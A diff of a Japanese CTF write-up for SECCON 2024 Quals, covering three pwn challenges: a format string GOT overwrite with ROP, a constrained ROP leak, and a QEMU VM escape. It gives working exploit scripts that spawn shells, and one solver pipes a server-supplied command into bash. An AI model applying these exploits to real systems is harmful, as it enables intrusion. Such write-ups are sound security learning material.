@@ -1,14 +1,22 @@
+---
+layout: page
+title: SECCON 2024 Quals
+parent: CTF Writeups
+nav_order: 6
+---
+
 # SECCON 2024 Quals Writeup
 
 - Paragraph
 - Make ROP Great Again
 - BabyQEMU
 
-の3問を解きました。
+の 3 問を解きました。
 
 ## [pwn] Paragraph
-自明FSBがある。no-pieなので、printf@gotを改ざんできる。今回はscanf@pltへ改ざんする。
-printfが死んでもputsがいるので遠慮はいらない。
+
+自明 FSB がある。no-pie なので、printf@got を改ざんできる。今回は scanf@plt へ改ざんする。
+printf が死んでも puts がいるので遠慮はいらない。
 
 改ざんすると
 
@@ -16,7 +24,7 @@ printfが死んでもputsがいるので遠慮はいらない。
 scanf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);
 ```
 
-が呼ばれることになるので、無制限なStack BoFが手に入る。一回目は`puts(puts)`でリーク、二回目に入ってlibc ROPすればシェル。
+が呼ばれることになるので、無制限な Stack BoF が手に入る。一回目は`puts(puts)`でリーク、二回目に入って libc ROP すればシェル。
 
 ```python
 #!/bin/python3
@@ -54,10 +62,10 @@ sock.recv(6) # skip garbage
 
 payload = flat([
     0xdeadbeef,  # fill the buffer
-    0xdeadbeef, 
-    0xdeadbeef, 
-    0xdeadbeef, 
-    0xdeadbeef, 
+    0xdeadbeef,
+    0xdeadbeef,
+    0xdeadbeef,
+    0xdeadbeef,
     next(elf.gadget("pop rdi; ret")),
     elf.got("puts"),
     0x401030, # puts@plt
@@ -86,10 +94,10 @@ sock.sendline(b'1') # and write 1 to the buffer
 # let's craft ROP chain
 payload = flat([
     0xdeadbeef,  # fill the buffer
-    0xdeadbeef, 
-    0xdeadbeef, 
-    0xdeadbeef, 
-    0xdeadbeef, 
+    0xdeadbeef,
+    0xdeadbeef,
+    0xdeadbeef,
+    0xdeadbeef,
     next(elf.gadget("ret")),
     next(elf.gadget("pop rdi; ret")),
     next(libc.search(b"/bin/sh\x00")),
@@ -105,7 +113,7 @@ code.interact(local=locals())
 
 ## [pwn] Make ROP Great Again
 
-自明なStack BoFがあるが、ROPガジェットが終わっているためリークができない。FULL Relroなのでinitを使ってputs(stdout)もできず、リークを頑張るという問題。
+自明な Stack BoF があるが、ROP ガジェットが終わっているためリークができない。FULL Relro なので init を使って puts(stdout)もできず、リークを頑張るという問題。
 
 バイナリ中にリークに使えそうな場所を探すと、
 
@@ -116,15 +124,15 @@ code.interact(local=locals())
 4010f0:       c3                      ret
 ```
 
-がある(0x404010はstdout@got)。raxをputsにするというのが当面の方針となる。
+がある(0x404010 は stdout@got)。rax を puts にするというのが当面の方針となる。
 
-さて、バイナリ中でraxを変更できるガジェットはいくつかあるが、使ったのは次のもの
+さて、バイナリ中で rax を変更できるガジェットはいくつかあるが、使ったのは次のもの
 
 ```
 0x401157: add eax, 0x00002ECB ; add  [rbp-0x3D], ebx ; nop ; ret ;
 ```
 
-しかし、raxを正確にputsにしたいため、このガジェットでは0x2ecbの倍数しか設定できず不十分。そこでputsの返り値を使う。putsは表示した文字数分raxに入れて返すので、あまりの分を出力し、残りをガジェットで合わせれば良い。
+しかし、rax を正確に puts にしたいため、このガジェットでは 0x2ecb の倍数しか設定できず不十分。そこで puts の返り値を使う。puts は表示した文字数分 rax に入れて返すので、あまりの分を出力し、残りをガジェットで合わせれば良い。
 
 ```
 puts@plt==0x401060
@@ -132,7 +140,7 @@ puts@plt==0x401060
 0x401060 % 0x2ecb = 0x16d6
 ```
 
-もちろん、0x16d6文字ちょうどの文字列が存在しているわけはないので、自分で作る必要がある。幸い、getsは書き込みが正常に行われるとそこへのポインタを返すので、次のようなROPペイロードを送ると、raxに0x401060を設定できる。
+もちろん、0x16d6 文字ちょうどの文字列が存在しているわけはないので、自分で作る必要がある。幸い、gets は書き込みが正常に行われるとそこへのポインタを返すので、次のような ROP ペイロードを送ると、rax に 0x401060 を設定できる。
 
 ```
 gets(後で0x16d6分入力する)
@@ -144,17 +152,17 @@ puts
 0x401157 (0x15e回入れる)
 ```
 
-しかしこの方法にも問題があり、書き込む先のバッファがrdiで指定されるため、自由に設定できないという点である（設定できるならそもそもこんな回りくどいことはしない）。
+しかしこの方法にも問題があり、書き込む先のバッファが rdi で指定されるため、自由に設定できないという点である（設定できるならそもそもこんな回りくどいことはしない）。
 
-何かしらの関数からretしたとき、$rdi$がwritableな領域にあるかどうかチェックを行うと、mainから帰るとき、
+何かしらの関数から ret したとき、$rdi$が writable な領域にあるかどうかチェックを行うと、main から帰るとき、
 
 ```
 *RDI  0x7ffff7fb0720 (_IO_stdfile_0_lock) ◂— 0
 ```
 
-となっており、これはlibcのrwな領域であった。つまり、先程のROPペイロードをmainから帰るときに行えば良い。
+となっており、これは libc の rw な領域であった。つまり、先程の ROP ペイロードを main から帰るときに行えば良い。
 
-が、更にこの方法にも問題がある。領域はstdinのlockを指し示しているせいで、書き込んでしまうと次回のlockで死んでしまい、書き込むことができなくなるという点である。そこで、rdi全体を書き換えることはできなくても、下位バイトだけでもずらせないかとROPガジェットを探すと、ediやdi,dilレジスタにも視野を広げる必要があるが次のガジェットが見つかった。
+が、更にこの方法にも問題がある。領域は stdin の lock を指し示しているせいで、書き込んでしまうと次回の lock で死んでしまい、書き込むことができなくなるという点である。そこで、rdi 全体を書き換えることはできなくても、下位バイトだけでもずらせないかと ROP ガジェットを探すと、edi や di,dil レジスタにも視野を広げる必要があるが次のガジェットが見つかった。
 
 ```
 pwndbg> x/5i 0x4010e9
@@ -171,7 +179,7 @@ pwndbg> x/5i 0x401155
    0x401160 <__do_global_dtors_aux+32>: ret
 ```
 
-このガジェットを2回実行すると、
+このガジェットを 2 回実行すると、
 
 ```
 pwndbg> x/10gx 0x7ffff7fb0720
@@ -194,11 +202,12 @@ pwndbg> x/10gx 0x7ffff7fb0780
 0x7ffff7fb07c0 <__pthread_keys+64>:     0x0000000000000000      0x0000000000000000
 ```
 
-のように、lockとは関係ない場所にrdiが移動する(\_\_pthread_keys)。ここは書き込んでも大丈夫なので（大丈夫だったので）、この領域に移しgetsを実行し、更にputsを使えばリークができる。あとはもう一度書き込むときにlibcでsystem("/bin/sh")を呼べば良い。
+のように、lock とは関係ない場所に rdi が移動する(\_\_pthread_keys)。ここは書き込んでも大丈夫なので（大丈夫だったので）、この領域に移し gets を実行し、更に puts を使えばリークができる。あとはもう一度書き込むときに libc で system("/bin/sh")を呼べば良い。
 
-exploitを書く際は、全体的にrbpの扱いをうまくやらないと、スタックの不足などで死ぬため、bssをうまく活用しなければならない。
+exploit を書く際は、全体的に rbp の扱いをうまくやらないと、スタックの不足などで死ぬため、bss をうまく活用しなければならない。
 
 solver
+
 ```python
 #!/bin/python3
 
@@ -238,7 +247,7 @@ gets_rbp_0x10 = symbols[b'main'] + 17
 
 payload = flat([
     0, # fill the buffer
-    0, 
+    0,
     moved_stack, # rbp
     next(elf.gadget("ret")), # adjust stack
     gets_rbp_0x10
@@ -316,8 +325,8 @@ code.interact(local=locals())
 
 ## [pwn] BabyQEMU
 
-ホスト側に自明なBoFを引き起こすデバイスが追加されたQEMUに対して攻撃を行い、VM Escapeを行う。
-デバイスはpciに生えているので、ユーザランドからmmapしてアクセスすれば使うことができる。次のようなライブラリを作った。
+ホスト側に自明な BoF を引き起こすデバイスが追加された QEMU に対して攻撃を行い、VM Escape を行う。
+デバイスは pci に生えているので、ユーザランドから mmap してアクセスすれば使うことができる。次のようなライブラリを作った。
 
 ```c
 volatile uint32_t *mmio_base;
@@ -366,7 +375,7 @@ uint64_t read_at_u64(uint64_t offset) {
       mmap(NULL, MMIO_REGION_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 ```
 
-この辺はChatGPTが書いてくれたので楽。
+この辺は ChatGPT が書いてくれたので楽。
 
 さて、このオフセット、負の値も設定できるため、前の領域を書き換えることができる。その時のヒープを見てみると、
 
@@ -402,18 +411,18 @@ pwndbg> tel &ms->buffer -r 30
 1d:00e8│  0x55555b3ef988 ◂— 0
 ```
 
-と、`0x55555b3ef8c0` にbabydevのread,writeへのポインタが乗っていそうなところがある。それ以外にも、ヒープ自身のアドレスもたくさん乗っており、適当なところからアドレスのリークができる。
+と、`0x55555b3ef8c0` に babydev の read,write へのポインタが乗っていそうなところがある。それ以外にも、ヒープ自身のアドレスもたくさん乗っており、適当なところからアドレスのリークができる。
 
-これでRIPを取ることができるが、どこに飛ばすかが問題。
-最初はstdoutやstdinが死んでいると思い、mprotect+shellcodeでフラグをヒープに乗せると思っていたのだが、普通に`system("/bin/sh")`を呼べば素直にシェルが落ちてくる。そこでlibc leakを行うことを考える。
+これで RIP を取ることができるが、どこに飛ばすかが問題。
+最初は stdout や stdin が死んでいると思い、mprotect+shellcode でフラグをヒープに乗せると思っていたのだが、普通に`system("/bin/sh")`を呼べば素直にシェルが落ちてくる。そこで libc leak を行うことを考える。
 
-そもそも、bufferはbaby.c内で次のようにアロケーションされている。
+そもそも、buffer は baby.c 内で次のようにアロケーションされている。
 
 ```
 ms->reg_mmio = g_malloc(sizeof(struct PCIBabyDevReg));
 ```
 
-`g_malloc`はglibの関数で、
+`g_malloc`は glib の関数で、
 
 ```c
 gpointer
@@ -438,10 +447,10 @@ g_malloc (gsize n_bytes)
 }
 ```
 
-と、mallocが使われているため、遡っていけばどこかにunsorted_binに繋がれたmain_arenaへのポインタがあるはず。
-探すと、あり、leakできる。
+と、malloc が使われているため、遡っていけばどこかに unsorted_bin に繋がれた main_arena へのポインタがあるはず。
+探すと、あり、leak できる。
 
-opsのwriteあたりをsystemにすると、
+ops の write あたりを system にすると、
 
 ```
 static void pci_babydev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
@@ -450,7 +459,7 @@ static void pci_babydev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsi
 の`opaque`をコマンドとして実行することになる。この`opaque`もヒープに乗っているため、そこに b"/bin/sh\x00" を書き込めば勝ち。
 
 ヒープがかなり決定的に決まるので解けた。
-ちなみに、stdoutが死んでいても、qemuにはrwxな領域が存在するため、そこへの書き込みとジャンプでshellcode実行も達成できる（と思う）。
+ちなみに、stdout が死んでいても、qemu には rwx な領域が存在するため、そこへの書き込みとジャンプで shellcode 実行も達成できる（と思う）。
 
 ゲストで実行するバイナリは次の通り。
 
@@ -537,7 +546,7 @@ int main() {
   printf("[+] wrote /bin/sh at 0x%lx\n", heap_leak);
 
   write_at_u64(1, libc_leak +
-                      0x0000000000058740); // overwrite system to `write` ops
+                       0x0000000000058740); // overwrite system to `write` ops
   printf("[+] overwrite babyops(write). host's system = 0x%lx\n",
          libc_leak + 0x0000000000058740);
 
@@ -553,7 +562,7 @@ int main() {
 }
 ```
 
-余談だが、バイナリを小さくしても転送に失敗してしまい手こずった。gzipが使えたの、圧縮したら行けた。
+余談だが、バイナリを小さくしても転送に失敗してしまい手こずった。gzip が使えたの、圧縮したら行けた。
 
 ```python
 from ptrlib import *
@@ -577,7 +586,7 @@ with open("./exploit/main.gz", "rb") as f:
 sock = Socket("babyqemu.seccon.games", 3824)
 command = sock.recvline()
 token = subprocess.run(["bash", "-c", command.decode()], capture_output=True).stdout.decode()
- 
+
 print(f"Token: {token}")
 sock.sendlineafter(b"token", token)
 
@@ -599,7 +608,6 @@ sock.sendline("echo YOU GOT SHELL")
 
 sock.sh()
 ```
-
 
 # 感想
 
